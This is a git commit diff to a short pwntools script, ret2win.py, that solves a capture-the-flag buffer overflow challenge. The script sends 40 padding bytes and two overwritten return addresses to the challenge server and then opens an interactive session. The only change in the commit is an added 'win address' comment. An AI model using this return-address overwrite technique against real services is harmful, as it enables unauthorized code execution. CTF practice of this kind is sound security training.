57b75d76331d537df78d8ca35c668f96953512e5
Navinduvin <71208443+navin-duvin@users.noreply.github.com>
2021-10-25 14:52:10 +0530

    Update ret2win.py

--- ret2win.py
+++ ret2win.py
@@ -4,8 +4,8 @@ from pwn import *
 fil = remote('pwn.chall.pwnoh.io', 13379)
 
 payload = b'a'*40
-payload += p64(0x4011E0)
-payload += p64(0x401245)
+payload += p64(0x4011E0) # win address
+payload += p64(0x401245) 
 
 fil.send(payload)
 fil.interactive()
